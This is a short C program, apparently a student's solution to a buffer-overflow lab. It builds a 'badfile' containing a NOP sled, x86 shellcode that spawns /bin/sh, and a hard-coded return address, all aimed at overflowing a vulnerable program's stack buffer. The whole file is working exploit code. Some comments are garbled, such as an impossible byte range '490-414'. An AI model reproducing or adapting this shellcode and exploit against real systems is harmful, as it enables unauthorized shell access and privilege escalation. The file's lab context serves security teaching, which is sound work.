/* exploit.c */
/* Author: Rishabh Sawhney
/* A Program that creates a file containing code for launching shells */
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

char shellcode[] =
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
;

char retaddr[] = "\x01\xf3\xff\xbf";

int main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);

	/* You need to fill the buffer with appropriate contents here */
	/* Fill the 24 bytes from 490-414 with the shellcode */
	memcpy(buffer+490, shellcode, 24);
	/* Fill in the return address to the shellcode */
	memcpy(buffer+36, retaddr, 4);

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
